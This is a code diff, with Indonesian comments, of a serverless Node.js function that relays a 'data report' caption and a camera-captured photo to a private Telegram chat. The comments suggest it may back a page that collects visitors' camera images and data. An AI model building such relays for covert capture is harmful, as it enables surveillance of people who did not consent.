@@ -6,8 +6,12 @@
  * dan TIDAK terlihat di kode frontend.
  */
 
+// Library untuk membuat form data yang kompatibel dengan multi-part request
+const FormData = require('form-data');
+// Library bawaan Node.js untuk I/O (file, path, dsb.)
+const fetch = require('node-fetch');
+
 // Kunci Keamanan: Ambil token dan ID dari Variabel Lingkungan
-// Catatan: Variabel-variabel ini HARUS diatur di Vercel/Netlify.
 const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
@@ -18,6 +22,43 @@ function base64ToBuffer(base64) {
     return Buffer.from(base64Data, 'base64');
 }
 
+/**
+ * Fungsi utilitas untuk mengurai body request secara aman.
+ * Ini mengatasi error "Unexpected end of JSON input" jika body request kosong atau tidak terurai otomatis.
+ */
+async function parseBody(req) {
+    if (req.body) {
+        return req.body;
+    }
+    
+    // Jika req.body tidak terurai otomatis, coba mengurai stream mentah
+    return new Promise((resolve, reject) => {
+        let body = '';
+        req.on('data', chunk => {
+            body += chunk.toString();
+        });
+        req.on('end', () => {
+            try {
+                // Hati-hati: Jika body kosong, JSON.parse akan gagal
+                if (!body) {
+                    resolve({}); // Mengembalikan objek kosong jika body kosong
+                    return;
+                }
+                // Jika request content-type-nya JSON, parse
+                if (req.headers['content-type'] && req.headers['content-type'].includes('application/json')) {
+                    resolve(JSON.parse(body));
+                } else {
+                    // Untuk non-JSON (misalnya form-urlencoded), kembalikan string mentah
+                    resolve({ rawBody: body });
+                }
+            } catch (error) {
+                reject(new SyntaxError("Gagal mengurai body request: " + error.message));
+            }
+        });
+        req.on('error', reject);
+    });
+}
+
 module.exports = async (req, res) => {
     // 1. Verifikasi Metode dan Token
     if (req.method !== 'POST') {
@@ -26,32 +67,33 @@ module.exports = async (req, res) => {
     }
 
     if (!BOT_TOKEN || !CHAT_ID) {
-        // Ini adalah error SISI SERVER yang tidak akan dilihat pengguna
-        console.error("TELEGRAM_BOT_TOKEN atau TELEGRAM_CHAT_ID tidak diatur!");
-        res.status(500).json({ error: 'Kesalahan konfigurasi server (Token/ID hilang).' });
-        return;
-    }
-
-    const { caption, base64Image, isPhoto } = req.body;
-
-    if (!caption) {
-        res.status(400).json({ error: 'Caption/Teks tidak boleh kosong.' });
+        console.error("TELEGRAM_BOT_TOKEN atau TELEGRAM_CHAT_ID tidak diatur.");
+        res.status(500).json({ error: 'Variabel lingkungan bot tidak diatur di server.' });
         return;
     }
 
     try {
-        let telegramResponse;
+        // Coba mengurai body request. Jika error, akan ditangkap di catch block.
+        const payload = await parseBody(req);
         
+        // 2. Ekstrak Data dari Payload
+        const { caption, base64Image, isPhoto } = payload;
+
+        if (!caption) {
+            res.status(400).json({ error: 'Caption (laporan data) tidak boleh kosong.' });
+            return;
+        }
+
+        let telegramResponse;
+
+        // 3. Logika Pengiriman FOTO + Teks (Menggunakan form-data)
         if (isPhoto && base64Image) {
-            // Logika Pengiriman FOTO (menggunakan FormData di sisi server)
-            
-            const photoBuffer = base64ToBuffer(base64Image);
-            const { default: FormData } = await import('form-data');
+            const buffer = base64ToBuffer(base64Image);
             const formData = new FormData();
             
-            // Tambahkan file foto (sebagai buffer)
-            formData.append('photo', photoBuffer, {
-                filename: 'captured_photo.jpeg',
+            // Append foto sebagai file buffer
+            formData.append('photo', buffer, {
+                filename: 'photo.jpg',
                 contentType: 'image/jpeg',
             });
             formData.append('chat_id', CHAT_ID);
@@ -66,8 +108,8 @@ module.exports = async (req, res) => {
             });
 
         } else {
-            // Logika Pengiriman PESAN Teks Saja
-            const payload = {
+            // 4. Logika Pengiriman PESAN Teks Saja (Jika gagal mendapatkan foto/kamera non-aktif)
+            const textPayload = {
                 chat_id: CHAT_ID,
                 text: caption,
                 parse_mode: 'Markdown'
@@ -76,11 +118,21 @@ module.exports = async (req, res) => {
             telegramResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
+                body: JSON.stringify(textPayload)
             });
         }
 
-        const data = await telegramResponse.json();
+        // 5. Proses Respon Telegram
+        // Menggunakan text() alih-alih json() untuk debugging error parsing body.
+        const rawText = await telegramResponse.text(); 
+        
+        let data;
+        try {
+            data = JSON.parse(rawText);
+        } catch (e) {
+            console.error('Gagal parse JSON dari Telegram:', rawText);
+            throw new Error('Respon Telegram bukan JSON yang valid.');
+        }
 
         if (!data.ok) {
             console.error('Telegram API Error:', data.description);
@@ -92,6 +144,11 @@ module.exports = async (req, res) => {
 
     } catch (error) {
         console.error('Server Proxy Error:', error);
-        res.status(500).json({ error: 'Kesalahan internal server saat menghubungi Telegram.' });
+        // Tangani SyntaxError: Unexpected end of JSON input
+        if (error.message.includes('SyntaxError')) {
+             res.status(400).json({ error: 'Payload tidak valid (JSON terpotong atau kosong). Pastikan data Base64 utuh.' });
+        } else {
+             res.status(500).json({ error: error.message || 'Terjadi kesalahan server yang tidak terduga.' });
+        }
     }
 };
